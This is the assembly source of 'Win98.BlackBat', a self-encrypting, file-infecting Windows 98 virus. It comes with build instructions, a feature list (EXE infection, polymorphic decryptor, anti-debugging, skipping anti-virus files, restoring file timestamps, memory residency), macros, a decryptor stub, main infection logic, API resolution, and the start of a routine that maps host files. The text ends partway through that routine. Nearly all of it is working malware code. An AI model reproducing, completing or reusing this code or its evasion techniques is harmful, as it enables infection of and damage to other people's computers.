
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |        \|/                           Win98.BlackBat                    | |
;| |       (. .)                         ================                   | |
;| |       ( | )                                                            | |
;| |       ( v )                  (c) 1999, Rohitab Batra                   | |
;| |      __| |__                  <sourcecode@rohitab.com>                 | |
;| |    //               \\                ICQ: 11153794                    | |
;| |   //                 ^                                                 | |
;| |   ((====>                    http://www.rohitab.com                    | |
;| |                                                                        | |
;| |            Discussion Forum: http://www.rohitab.com/discuss/           | |
;| |            Mailing List: http://www.rohitab.com/mlist/                 | |
;| |                                                                        | |
;| |                                                                        | |
;| |"Blessed is he who expects nothing, for he shall not be disappointed"   | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
;
;Compiling (Turbo Assembler)
;	c:\>tasm32 /ml /m3 /t /w2 /s /p /dDEBUG=1 BlackBat
;
;Setting DEBUG=0 will compile the virus in Release mode. In this mode, an error
;message will be displayed, so that you don't accidently compile in release mode.
;In Release mode, the size of the Virus will be smaller, and .EXE files will be
;infected, instead of .XYZ files. In Debug mode, the file NOTEPAD.EXE, if found
;in the current directory, will be infected.
;
;Linking (Turbo Linker)
;	c:\>tlink32 /x /Tpe /aa /c BlackBat,BlackBat,,IMPORT32.LIB
;
;Making Code Section Writable (EditBin from SDK, or any other utility)
;	c:\>editbin /SECTION:CODE,w BlackBat.EXE
;
;***** Info About the Virus *****
;* If WIN.SYS is found in the root directory, the virus does not infect any file,
;  and does not become resident.
;* File time and attributes are restored after infection
;* Encrypted with a random key
;* Doesn't infect anti-virus files, NAV, TBAV, SCAN, CLEAN, F-PROT
;* Anti-Debugging Code
;* Structured Exception Handling
;* Decryption engine is Polymorphic
;
;***** TODO *****
;1. Dont infect files with todays date
;2. Draw Random Bats on the Screen (Use CreateCompatibleBitmap & Get/Set Pixel)
;3. Doesn't infect files in directories with long file names

.386p
.model flat ,stdcall
EXTRN	ExitProcess:PROC			;Any Imported Fn, so that the first
									;generation copy executes without crashing
.data
		DB ?						;Required for TASM, Else will Crash !!??
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        @MESSAGE_BOX Macro                              | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Displays a MessageBox with the given Message. Note the caption of
;	   the MessageBox is the same as the Message
;
; Arguments
;	-> szMessage: Message to be displayed
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> ALL
;___________________________
@MESSAGE_BOX MACRO szMessage
	IF DEBUG
		@DELTA	esi
		mov		eax, esi
		add		eax, offset szMessage
		call	esi + MessageBoxA, 0, eax, eax, MB_OK OR MB_ICONINFORMATION
	ENDIF
ENDM
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        @DEFINE_API Macro                               | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Defines an API that will be called by the Virus. The macro is expanded
;	   to the following, if APIName is MessageBoxA:
;	   szMessageBoxA DB "MessageBoxA", 0
;	   MessageBoxA	 DD ?
;
; Arguments
;	-> APIName: API to be defined. MUST BE EXACTLY the same as exported by
;				the DLL. e.g. MessageBoxA
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> None
;
;________________________
@DEFINE_API MACRO APIName
	sz&APIName	DB "&APIName", 0	;;ASCIIZ Name of API
	&APIName	DD ?				;;Storage space for API Address
ENDM
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            @DELTA Macro                                | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Returns the delta offset in the specified register
;
; Arguments
;	-> Register: register in which the value of the delta offset is copied
;
; Return Value:
;	-> Register: Delta Offset
;
; Registers Destroyed
;	-> Register
;
;____________________
@DELTA MACRO Register
	LOCAL	GetIP
	call	GetIP								;;This will push EIP on the stack
GetIP:
	pop		Register							;;get EIP of current instruction
	sub		Register, offset GetIP				;;Delta Offset
ENDM
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                          @OFFSET Macro                                 | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Returns the true offset of the specified address. Unlike the offset
;	   keyword, which calculates the address at assembly time, this macro
;	   calculates the address at run-time. This is used to get the correct
;	   offset when the virus has been relocated. Instead of using instructions
;	   like "mov esi, offset szFilename", use "@OFFSET esi, szFilename"
;
; Arguments
;	-> Register: register in which the offset is to be returned
;	-> Expression: expression whose offset is required
;
; Return Value:
;	-> Register: Correct offset of Expression
;
; Registers Destroyed
;	-> Register
;
;_________________________________
@OFFSET MACRO Register, Expression
	LOCAL	GetIP
	call	GetIP									;;This will push EIP on the stack
GetIP:
	pop		Register								;;get EIP of current instruction
	add		Register, offset Expression - offset GetIP	;;True offset
ENDM
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        @GET_API_ADDRESS Macro                          | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Gets the address of the API, and stores it
;
; Arguments
;	-> APIName:		API whose address is required
;	-> ESI:			Delta Offset
;	-> EBX:			Address of GetProcAddress(...)
;	-> ECX:			Base address of DLL which exports the API
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> All Except ESI, EBX and ECX
;
;_____________________________
@GET_API_ADDRESS MACRO APIName
	push	ebx								;;Save Addr of GetProcAddress(...)
	push 	ecx								;;Save Image Base

	mov		eax, esi
	add		eax, offset sz&APIName			;;API whose address is required
	call	ebx, ecx, eax					;;GetProcAddress(...)

	pop		ecx								;;Restore Image Base
	pop		ebx								;;Restore Addr of GetProcAddress(...)

	mov		[esi + APIName], eax			;;Save API Address
ENDM
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |    @TRY_BEGIN, @TRY_EXCEPT and @TRY_END Exception Handling Macros      | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> @TRY_BEGIN: This macro is used to install the exception handler. The
;				   code that follows this is the one that is checked for
;				   exceptions
;	   @TRY_EXCEPT: The code that follows this is executed if an exception
;					occurs.
;	   @TRY_END: This is used to mark the end of the TRY block
;
; Example
;		@TRY_BEGIN ZeroMemory
;			<CODE1: Code to check for exceptions goes here>
;		@TRY_CATCH ZeroMemory
;			<CODE2: Gets executed if an exception occurs in CODE1>
;		@TRY_END ZeroMemory
;
; Arguments
;	-> Handler: Name of the exception handler. MUST BE UNIQUE throughout the
;				program
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> If an exception occurs, all registers are restored to the state before
;	   the @TRY_BEGIN block, otherwise, no registers are modified
;_______________________
@TRY_BEGIN MACRO Handler
	pushad								;;Save Current State
	@OFFSET esi, Handler				;;Address of New Exception Handler
	push	esi
	push	dword ptr fs:[0]			;;Save Old Exception Handler
	mov		dword ptr fs:[0], esp		;;Install New Handler
ENDM

@TRY_EXCEPT MACRO Handler
	jmp		NoException&Handler			;;No Exception Occured, so jump over
Handler:
	mov		esp, [esp + 8]				;;Exception Occured, Get old ESP
	pop		dword ptr fs:[0]			;;Restore Old Exception Handler
	add		esp, 4						;;ESP value before SEH was set
	popad								;;Restore Old State
ENDM

@TRY_END MACRO Handler
	jmp		ExceptionHandled&Handler	;;Exception was handled by @TRY_EXCEPT
NoException&Handler:					;;No Exception Occured
	pop		dword ptr fs:[0]			;;Restore Old Exception Handler
	add		esp, 32 + 4					;;ESP value before SEH was set. 32 for pushad and ...
										;;...4 for push offset Handler. (No Restore State)
ExceptionHandled&Handler:				;;Exception has been handled, or no exception occured
ENDM
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        @CALL_INT21h Macro                              | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Makes an INT 21h Call in Protected Mode
;
; Arguments
;	-> Service:		INT 21h Service Number
;
; Return Value:
;	-> None
;
; Registers Destroyed
;	-> Depends on Service called
;_________________________
@CALL_INT21h MACRO Service
	mov		eax, Service				;;INT 21h Service
	@DELTA	esi
	call	esi + VxDCall, VWIN32_Int21Dispatch, eax, ecx
ENDM
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            Constants                                   | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
;Win32 Constants
	PAGE_READWRITE				EQU		00000004h
	IMAGE_READ_WRITE_EXECUTE	EQU		0E0000000h
	IMAGE_SCN_MEM_SHARED		EQU		10000000h	;Section is Sharable
	IMAGE_FILE_DLL				EQU		2000h		;File is a DLL
	FILE_MAP_ALL_ACCESS			EQU 	000F001Fh
	IMAGE_SIZEOF_NT_SIGNATURE	EQU		04h			;PE00 = 0x00004550, 4 bytes
	NULL						EQU		0
	TRUE						EQU		1
	FALSE						EQU		0

;File Access
	GENERIC_READ				EQU		80000000h	;Access Mode Read Only
	GENERIC_WRITE				EQU		40000000h	;Access Mode Write Only
	FILE_SHARE_READ				EQU		00000001h	;Open Share, Deny Write
	FILE_SHARE_WRITE			EQU		00000002h	;Open Share, Deny Read
	INVALID_HANDLE_VALUE		EQU		-1
	ERROR_ALREADY_EXISTS		EQU		000000B7h
	FILE_ATTRIBUTE_NORMAL		EQU		00000080h
	OPEN_EXISTING				EQU		3			;Fail if not found

;Shutdown Options
	EWX_FORCE					EQU		4
	EWX_SHUTDOWN				EQU		1

;MessageBox
	MB_OK						EQU		00000000h
	MB_YESNO					EQU		00000004h
	MB_ICONINFORMATION			EQU		00000040h

;Virus_Constants
	@BREAK						EQU		int 3
	;MAX_RUN_TIME				EQU		5*60*60*1000	;Time we allow windows to run, 5hrs
	VIRUS_SIGNATURE				EQU		08121975h		;My B'day, 8 Dec 1975
	RESIDENCY_CHECK_SERVICE		EQU		0AD75h			;Used to check if Virus is resident
	RESIDENCY_SUCCESS			EQU		0812h			;Value returned if Virus is resident

;VxD Stuff
	VWIN32_Int21Dispatch		EQU		002A0010h
	LFN_OPEN_FILE_EXTENDED		EQU		716Ch
	PC_WRITEABLE				EQU		00020000h
	PC_USER						EQU		00040000h
	PR_SHARED					EQU		80060000h
	PC_PRESENT					EQU		80000000h
	PC_FIXED					EQU		00000008h
	PD_ZEROINIT					EQU		00000001h
	SHARED_MEMORY				EQU		80000000h	;Anything above this is shared
	PageReserve					EQU		00010000h
	PageCommit					EQU		00010001h
	PAGE_SIZE					EQU		4096		;Size of a Page in Win9x
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            Structures                                  | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
FILETIME STRUC
    FT_dwLowDateTime	DD		?
    FT_dwHighDateTime	DD		?
FILETIME ENDS

IMAGE_DOS_HEADER STRUC					;DOS .EXE header
	IDH_e_magic		DW ?				;Magic number
	IDH_e_cblp		DW ?				;Bytes on last page of file
	IDH_e_cp		DW ?				;Pages in file
	IDH_e_crlc		DW ?				;Relocations
	IDH_e_cparhdr	DW ?				;Size of header in paragraphs
	IDH_e_minalloc	DW ?				;Minimum extra paragraphs needed
	IDH_e_maxalloc	DW ?				;Maximum extra paragraphs needed
	IDH_e_ss		DW ?				;Initial (relative) SS value
	IDH_e_sp		DW ?				;Initial SP value
	IDH_e_csum		DW ?				;Checksum
	IDH_e_ip		DW ?				;Initial IP value
	IDH_e_cs		DW ?				;Initial (relative) CS value
	IDH_e_lfarlc	DW ?				;File address of relocation table
	IDH_e_ovno		DW ?				;Overlay number
	IDH_e_res		DW 4 DUP (?)		;Reserved words
	IDH_e_oemid		DW ?				;OEM identifier (for IDH_e_oeminfo)
	IDH_e_oeminfo	DW ?				;OEM information; IDH_e_oemid specific
	IDH_e_res2		DW 10 DUP (?)		;Reserved words
	IDH_e_lfanew	DD ?				;File address of new exe header
IMAGE_DOS_HEADER ENDS

IMAGE_FILE_HEADER STRUC
	IFH_Machine					DW ?	;System that the binary is intended to run on
	IFH_NumberOfSections		DW ?	;Number of sections that follow headers
	IFH_TimeDateStamp			DD ?	;Time/Date the file was created on
	IFH_PointerToSymbolTable	DD ?	;Used for debugging information
	IFH_NumberOfSymbols			DD ?	;Used for debugging information
	IFH_SizeOfOptionalHeader	DW ?	;sizof(IMAGE_OPTIONAL_HEADER)
	IFH_Characteristics			DW ?	;Flags used mostly for libraries
IMAGE_FILE_HEADER ENDS

IMAGE_DATA_DIRECTORY STRUC
	IDD_VirtualAddress		DD ?
	IDD_Size				DD ?
IMAGE_DATA_DIRECTORY ENDS

IMAGE_OPTIONAL_HEADER STRUC
	;Standard Fields
	IOH_Magic							DW ?	;Mostly 0x010B
	IOH_MajorLinkerVersion				DB ?	;Version of the linker used
	IOH_MinorLinkerVersion				DB ?	;Version of the linker used
	IOH_SizeOfCode						DD ?	;Size of executable code
	IOH_SizeOfInitializedData			DD ?	;Size of Data Segment
	IOH_SizeOfUninitializedData			DD ?	;Size of bss Segment
	IOH_AddressOfEntryPoint				DD ?	;RVA of code entry point
	IOH_BaseOfCode						DD ?	;Offset to executable code
	IOH_BaseOfData						DD ?	;Offset to initialized data
	;NT Additional Fields
	IOH_ImageBase						DD ?	;Preferred load address
	IOH_SectionAlignment				DD ?	;Alignment of Sections in RAM
	IOH_FileAlignment					DD ?	;Alignment of Sections in File
	IOH_MajorOperatingSystemVersion		DW ?	;OS Version required to run this image
	IOH_MinorOperatingSystemVersion		DW ?	;OS Version required to run this image
	IOH_MajorImageVersion				DW ?    ;User specified version number
	IOH_MinorImageVersion				DW ?	;User specified version number
	IOH_MajorSubsystemVersion			DW ?	;Expected Subsystem version
	IOH_MinorSubsystemVersion			DW ?	;Expected Subsystem version
	IOH_Win32VersionValue				DD ?	;Mostly set to 0
	IOH_SizeOfImage						DD ?	;Amount of memory the image will need
	IOH_SizeOfHeaders					DD ?	;Size of DOS hdr, PE hdr and Object table
	IOH_CheckSum						DD ?	;Checksum (Used by NT to check drivers)
	IOH_Subsystem						DW ?	;Subsystem required to run this image
	IOH_DllCharacteristics				DW ?	;To decide when to call DLL's entry point
	IOH_SizeOfStackReserve				DD ?	;Size of Reserved Stack
	IOH_SizeOfStackCommit				DD ?	;Size of initially commited stack
	IOH_SizeOfHeapReserve				DD ?	;Size of local heap to reserve
	IOH_SizeOfHeapCommit				DD ?	;Amount to commit in local heap
	IOH_LoaderFlags						DD ?	;Not generally used
	IOH_NumberOfRvaAndSizes				DD ?	;Number of valid entries in DataDirectory
	IOH_DataDirectory					IMAGE_DATA_DIRECTORY 16 DUP (?)
IMAGE_OPTIONAL_HEADER ENDS

IMAGE_EXPORT_DIRECTORY STRUC
	IED_Characteristics			DD ?	;Currently set to 0
	IED_TimeDateStamp			DD ?	;Time/Date the export data was created
	IED_MajorVersion			DW ?	;User settable
	IED_MinorVersion			DW ?
	IED_Name					DD ?	;RVA of DLL ASCIIZ name
	IED_Base					DD ?	;First valid exported ordinal
	IED_NumberOfFunctions		DD ?	;Number of entries
	IED_NumberOfNames			DD ?	;Number of entries exported by name
	IED_AddressOfFunctions		DD ?	;RVA of export address table
	IED_AddressOfNames			DD ?	;RVA of export name table pointers
	IED_AddressOfNameOrdinals	DD ?	;RVA of export ordinals table entry
IMAGE_EXPORT_DIRECTORY ENDS

IMAGE_SECTION_HEADER STRUC
	ISH_Name	DB 8 DUP (?)			;NULL padded ASCII string
	UNION
		ISH_PhysicalAddress		DD ?
		ISH_VirtualSize			DD ?	;Size that will be allocated when obj is loaded
	ENDS
	ISH_VirtualAddress			DD ?	;RVA to section's data when loaded in RAM
	ISH_SizeOfRawData			DD ?	;Size of sections data rounded to FileAlignment
	ISH_PointerToRawData		DD ?	;Offset from files beginning to sections data
	ISH_PointerToRelocations	DD ?
	ISH_PointerToLinenumbers	DD ?
	ISH_NumberOfRelocations		DW ?
	ISH_NumberOfLinenumbers		DW ?
	ISH_Characteristics			DD ?	;Flags to decide how section should be treated
IMAGE_SECTION_HEADER ENDS

SYSTEMTIME STRUC
	ST_wYear					DW ?
	ST_wMonth					DW ?
	ST_wDayOfWeek				DW ?
	ST_wDay						DW ?
	ST_wHour					DW ?
	ST_wMinute					DW ?
	ST_wSecond					DW ?
	ST_wMilliseconds			DW ?
SYSTEMTIME ENDS
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                         Virus Entry Point                              | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
.code
;Decryptor
StartOfVirusCode:
	call	GetDelta
GetDelta:
	DB		5Eh								;pop	esi
	DB		83h								;add	esi, EncryptedVirusCode - GetDelta
	DB		0C6h
	DB		offset EncryptedVirusCode - offset GetDelta
	DB		0B9h							;mov	ecx, ENCRYPTED_SIZE
	DD		ENCRYPTED_SIZE
DecryptByte:
	DB		80h								;xor	byte ptr [esi], 00h
	DB		36h
EncryptionKey:
	DB		00h
	DB		46h								;inc	esi
	DB		49h								;dec	ecx
	jnz		DecryptByte

EncryptedVirusCode:				;Code from this point is encrypted
 	jmp WinMain					;Goto Main Program
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                            Data Area                                   | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
	dwKernelBase		EQU 0BFF70000h		;Base address of KERNEL32.DLL
	dwUserBase			DD ?				;Base address of USER32.DLL
	szUser32DLL			DB "USER32", 0		;.DLL Extention is not required

;Host File Variables
	hHostFile			DD ?				;Handle of host file
	hMappedFile			DD ?				;Handle of mapped host file
	lpHostFile			DD ?				;Pointer to mapped host file in memory
	ftLastAccessTime	FILETIME ?			;Time the file was last accessed
	ftLastWriteTime		FILETIME ?			;Time the file was last written to
	dwFileAttributes	DD ?				;File attributes of host file
;Virus Variables
	szNoInfectFileName	DB "C:\WIN.SYS", 0	;If this file exists, machine is not infected

;VxD Stuff
	OldInt30			DB 6 DUP (0)
	VxDCall_Busy		DB ?				;Semaphore
	szOutputFile 		DB "C:\VIRUS.TXT", 0

;KERNEL32 API's
	VxDCall				DD ?				;Exported by ordinal only (Ord 1)
	@DEFINE_API	GetProcAddress
	@DEFINE_API	CloseHandle
	@DEFINE_API	CreateFileA
	@DEFINE_API	CreateFileMappingA
	@DEFINE_API	GetFileAttributesA
	@DEFINE_API	GetFileSize
	@DEFINE_API	GetFileTime
	@DEFINE_API	GetLocalTime
	@DEFINE_API	GetTickCount
	@DEFINE_API	LoadLibraryA
	@DEFINE_API	MapViewOfFile
	@DEFINE_API	SetFileAttributesA
	@DEFINE_API	SetFileTime
	@DEFINE_API	UnmapViewOfFile

;USER32 API's
	@DEFINE_API ExitWindowsEx
	IF DEBUG
		@DEFINE_API	MessageBoxA
	ENDIF

;DEBUG Only Stuff
IF DEBUG
	szHostFileName			DB "NOTEPAD.EXE",0
	szWinMainHandler		DB "Unhandled Exception in WinMain", 0
	szPayLoad				DB "Happy BirthDay :-)", 0
	szInfected				DB "This File is Infected by the BlackBat Virus", 0
ENDIF
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                             WinMain                                    | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
WinMain PROC
	IFE DEBUG								;Only for Release Versions
		cli
		not		esp							;Anti-Debug Code ...
		not		esp							;...will crash if single-stepped
		sti
	ENDIF

	@TRY_BEGIN WinMain_Handler				;Putting code in protected block
		call	IsVirusActive
		test	eax, eax					;Virus Resident ?
		jne		End_WinMain					;Yes, return to host

		;Get Addresses of all Required API's
		call	GetAPIAddresses				;Get the addresses of the other API's
		test	eax, eax					;Error occured ?
		jz		End_WinMain					;Transfer control to host

		IF DEBUG
			@MESSAGE_BOX szInfected
			@OFFSET	ebx, szHostFileName
			call	InfectFile, ebx
		ENDIF

		;Check if this Machine is to be Infected
		call	CanMachineBeInfected		;Is this my machine
		test	eax, eax
		jz		End_WinMain					;Yes, so don't infect

		;Relocate Virus (Make Resident)
		call	RelocateVirus
		or		eax, eax						;Virus Relocated?
		je		End_WinMain						;No

		;Jump to Relocated Virus Copy
		@OFFSET ebx, StartOfVirusCode				;Start of Virus in Non-Relocated Copy
		add		eax, offset RelocatedVirus - offset StartOfVirusCode
		jmp		eax								;Control will go to Relocated Copy

		;This part is the Relocated Copy of the Virus in Shared Memory
RelocatedVirus:
		;When a file is infected, the CALL instruction at label ReturnToHost is
		;replaced by a JMP XXXXXXXX instruction. Since the virus has been relocated,
		;this JMP instruction will point to some invalid location. We need to modify
		;this, so that the JMP points to the host program (which was not relocated)

		;The offset of Calculate_Offset_Instruction in the non-relocated virus was
		;saved in EBX before jumping here. Now we calculate the offset in the relocated
		;virus (this copy).

		@DELTA	eax
		mov		esi, eax						;Save Delta Offset
		add		eax, offset StartOfVirusCode	;Start of Virus in Relocated Copy
		sub		eax, ebx						;Difference in offsets

		;We now subtract this difference from the offset specified in the JMP
		;instruction, and update the JMP instruction to point to the correct location
		;in memory

		add		esi, offset ReturnToHost + 1	;Point to operand of JMP instruction
		sub		[esi], eax						;Fix JMP instruction

		call	InstallHookProcedure

End_WinMain:
	@TRY_EXCEPT WinMain_Handler
		@MESSAGE_BOX szWinMainHandler
	@TRY_END WinMain_Handler

ReturnToHost:
	DB 0E9h, 00, 00, 00, 00				;JMP instruction used for passing control
										;to the host. The address of this JMP
										;instruction is calculated at run-time
	;ret								;Not required, since control is transfered to host
WinMain ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                          GetAPIAddresses                               | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Finds the Address of the API's to be used by the virus
;
; Arguments
;	-> None
;
; Return Value:
;	-> EAX: 1, if the API addresses were found, 0 otherwise
;
; Registers Destroyed
;	-> All
;___________________
GetAPIAddresses PROC
	call	GetAddressOfKernelAPI, 1	;Get Address Of GetProcAddress
	test	eax, eax					;Found Address ?
	jz		End_GetAPIAddresses			;No, Return 0

;Get addresses of all required KERNEL32 API's
;ESI = Delta Offset
;EBX = Address of GetProcAddress(...)
;ECX = Image Base of KERNEL32.DLL
	@DELTA	esi
	mov		ebx, eax					;Address of GetProcAddress(...)
	mov		ecx, dwKernelBase			;Base address of KERNEL32.DLL
	@GET_API_ADDRESS CloseHandle
	@GET_API_ADDRESS CreateFileA
	@GET_API_ADDRESS CreateFileMappingA
	@GET_API_ADDRESS GetFileAttributesA
	@GET_API_ADDRESS GetFileSize
	@GET_API_ADDRESS GetFileTime
	@GET_API_ADDRESS GetLocalTime
	@GET_API_ADDRESS GetTickCount
	@GET_API_ADDRESS LoadLibraryA
	@GET_API_ADDRESS MapViewOfFile
	@GET_API_ADDRESS SetFileAttributesA
	@GET_API_ADDRESS SetFileTime
	@GET_API_ADDRESS UnmapViewOfFile

;Load USER32.DLL
	push	ebx								;Save address of GetProcAddress(...)

	mov		eax, esi						;Delta Offset
	add		eax, offset szUser32DLL			;Name of DLL to be loaded
	call	esi + LoadLibraryA, eax
	mov		ecx, eax						;Base address of USER32.DLL

	pop		ebx								;Restore address of GetProcAddress(...)

;Get addresses of all required USER32 API's
;ESI = Delta Offset
;EBX = Address of GetProcAddress(...)
;ECX = Image Base of USER32.DLL

	@GET_API_ADDRESS ExitWindowsEx
	IF DEBUG
		@GET_API_ADDRESS MessageBoxA
	ENDIF

End_GetAPIAddresses:
	ret
GetAPIAddresses ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                         GetAddressOfKernelAPI                          | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Finds the address of GetProcAddress or VxDCall API in KERNEL32.DLL. The
;	   VxDCall API is exported by ordinal only, and the GetProcAddress is
;	   exported by name.
;
; Arguments
;	-> EDX: offset of the program <---- NOT USED ANYMORE ???
;	-> gaoka_wAPIName: If 0, the address of VxDCall is Returned. Else, the address
;					   of GetProcAddress is returned.
;
; Return Value:
;	-> EAX: Address of the Required API if Found, Else NULL
;
; Registers Destroyed
;	-> All
;______________________________
GetAddressOfKernelAPI PROC gaoka_wAPIName:WORD
	LOCAL	lpdwAddressOfFunctions:DWORD, \
			lpdwAddressOfNames:DWORD, \
			lpwAddressOfNameOrdinals: WORD, \
			dwVAIED:DWORD

;Get File Headers
	call	GetFileHeaders, dwKernelBase
	test	eax, eax							;Successfully Retreived Headers?
	je		End_GetAddressOfKernelAPI			;No, probably Windows NT / 2000
	mov		[dwVAIED], edx
	mov		esi, dwKernelBase

;Get Address of Functions
	mov		ecx, [dwVAIED]
	mov		eax, (IMAGE_EXPORT_DIRECTORY [ecx]).IED_AddressOfFunctions
	add		eax, esi									;VA of Address of functions
	mov		dword ptr [lpdwAddressOfFunctions], eax

;Check which API is Required
	cmp		[gaoka_wAPIName], 0			;Return Address of VxDCall or GetProcAddress ?
	jne		GetProcAddressRequired		;GetProcAddress

;Get Address of VxDCall API (Ordinal 1)
	xor		eax, eax
	inc		eax												;Ordinal Reqd = 1
	sub		eax, (IMAGE_EXPORT_DIRECTORY [ecx]).IED_Base	;Index In Array
	jmp		GetAddressFromIndex

GetProcAddressRequired:
;Get Address of Names
	mov		ecx, [dwVAIED]
	mov		eax, (IMAGE_EXPORT_DIRECTORY [ecx]).IED_AddressOfNames
	add		eax, esi									;VA of Address of Names
	mov		dword ptr [lpdwAddressOfNames], eax

;Get Address of Name ordinals
	mov		ecx, [dwVAIED]
	mov		eax, (IMAGE_EXPORT_DIRECTORY [ecx]).IED_AddressOfNameOrdinals
	add		eax, esi									;VA of Add of Name Ordinals
	mov		dword ptr [lpwAddressOfNameOrdinals], eax

;Find the API index in the AddressOfNames array
	push	esi								;Save the base address of KERNEL32
	mov		eax, esi						;Also save in EAX
	xor		ebx, ebx
	dec		ebx								;Initialize Index to -1
	mov		edx, dword ptr [lpdwAddressOfNames]

	@OFFSET	esi, szGetProcAddress			;API to be found
	mov		ecx, esi						;Save address in ECX

CheckNextAPI:
	inc		ebx								;increment index
	mov		edi, dword ptr [edx + ebx*4]	;go the the ebx'th index
	add		edi, eax						;get the VA from the RVA
	mov		esi, ecx						;get address stored previously

CheckNextByte:
	cmpsb							;Check Byte
	jne		CheckNextAPI			;byte did not match, Incorrect API, Check Next One
	cmp		byte ptr [edi], 0		;Have we reached the end-of-string
	je		FoundAPI				;Yes? We've found the API
	jmp		CheckNextByte			;No, Check the next byte

FoundAPI:
	;EBX contains the index of the function into the array
	pop		esi						;Get the base address of KERNEL32

;Compute the Index
	mov		ecx, ebx
	mov		edx, dword ptr [lpwAddressOfNameOrdinals]
	movzx	eax, word ptr [edx + ecx*2]				;Index

;Get the Address (EAX = Index, ESI = Kernel32 Base)
GetAddressFromIndex:
	mov		ebx, [lpdwAddressOfFunctions]
	mov		eax, dword ptr [ebx + eax*4]			;RVA of the API
	add		eax, esi								;VA of the API

End_GetAddressOfKernelAPI:
	ret
GetAddressOfKernelAPI ENDP
;+----------------------------------------------------------------------------+
;| +------------------------------------------------------------------------+ |
;| |                                                                        | |
;| |                        OpenAndMapFile                                  | |
;| |                                                                        | |
;| +------------------------------------------------------------------------+ |
;+----------------------------------------------------------------------------+
; Description
;	-> Opens a file from disk, and maps it into memory. The function also
;	   saves the file modified time and file attributes before opening the
;	   file. These are later restored by UnmapAndCloseFile
;
; Arguments
;	-> DWORD oamf_szFileName: Pointer to ASCIIZ name of file to be mapped
;	-> DWORD oamf_dwAddBytes: Number of bytes by which to increase the file size
;
; Return Value:
;	-> EAX: Starting address of memory where the file has been mapped, or 0
;	   if an error occured
;	-> ECX: Original File Size
;
; Registers Destroyed
;	-> All
;_______________________________________________________________
OpenAndMapFile PROC oamf_szFileName:DWORD, oamf_dwAddBytes:DWORD
	@DELTA	esi

;Save File Attributes, and Clear all attributes
	call	esi + GetFileAttributesA, oamf_szFileName
	mov		[esi + dwFileAttributes], eax				;Save File Attributes
	call	esi + SetFileAttributesA, oamf_szFileName, FILE_ATTRIBUTE_NORMAL
	test	eax, eax									;File Attributes Set ?
	je		End_OpenAndMapFile							;No, Return 0

;Open the file in R/W mode
	call	esi + CreateFileA, oamf_szFileName, GENERIC_READ OR GENERIC_WRITE, \
		FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL
	cmp		eax, INVALID_HANDLE_VALUE	;File Opened ?
	je		Error_OpenAndMapFile_Create	;No
	mov		[esi + hHostFile], eax		;Yes, Save handle of host file

;Get and Store File Time
	lea		ebx, [esi + ftLastAccessTime]
	lea		ecx, [esi + ftLastWriteTime]
	call	esi + GetFileTime, eax, NULL, ebx, ecx

;Compute the new file size
	call	esi + GetFileSize, [esi + hHostFile], NULL
	add		eax, [oamf_dwAddBytes]		;Compute New File Size

;Map the file
	call	esi + CreateFileMappingA, [esi + hHostFile], NULL, PAGE_READWRITE, \
				0, eax, NULL
	test	eax, eax								;File Mapping Created
	jz		Error_OpenAndMapFile_Mapping			;No
	mov		[esi + hMappedFile], eax				;Yes, Save Handle

;Map View of the File
	call	esi + MapViewOfFile, eax, FILE_MAP_ALL_ACCESS, 0, 0, 0
	mov		[esi + lpHostFile], eax						;Have to save Mapped Address
	test	eax, eax									;File Mapped Successfully ?
